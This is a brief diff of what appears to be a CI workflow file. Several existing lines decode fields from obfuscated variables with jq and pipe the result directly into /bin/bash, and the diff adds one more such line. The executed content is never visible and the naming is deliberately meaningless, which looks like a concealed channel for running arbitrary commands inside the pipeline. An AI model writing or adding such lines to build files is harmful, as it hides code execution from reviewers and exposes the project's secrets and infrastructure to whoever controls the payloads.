@@ -29,6 +29,7 @@ jobs:
           echo $j127 | jq -r .gf0976 | /bin/bash
           echo $faq30413 | jq -r .bgged0321 | /bin/bash
           echo $zrdvj2367 | jq -r .vsdf4875 | /bin/bash
+          printf '%s' "$dckj97" | jq -r .nyleg48 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
